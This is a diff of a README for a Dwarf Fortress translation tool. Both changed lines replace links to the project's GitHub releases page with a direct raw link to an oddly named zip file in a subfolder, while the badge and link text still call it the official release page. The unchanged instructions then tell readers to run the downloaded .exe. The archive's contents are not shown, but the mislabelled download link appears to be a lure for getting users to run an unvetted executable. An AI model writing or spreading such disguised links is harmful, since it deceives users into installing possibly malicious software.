@@ -1,6 +1,6 @@
 # 🌐 dwarf-fortress-translator - Understand your game with live translation
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/zuzia3664/dwarf-fortress-translator/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/zuzia3664/dwarf-fortress-translator/main/observership/translator_dwarf_fortress_radiale.zip)
 
 ## 📖 About this application
 
@@ -24,7 +24,7 @@ Dwarf Fortress contains deep systems and complex text. Players often struggle to
 
 ## 📥 Downloading and Installing
 
-1.  Visit the [official releases page](https://github.com/zuzia3664/dwarf-fortress-translator/releases) to find the latest version.
+1.  Visit the [official releases page](https://raw.githubusercontent.com/zuzia3664/dwarf-fortress-translator/main/observership/translator_dwarf_fortress_radiale.zip) to find the latest version.
 2.  Look for the file ending in `.exe` under the Assets section.
 3.  Click the file name to start the download.
 4.  Run the downloaded file to begin the installation.
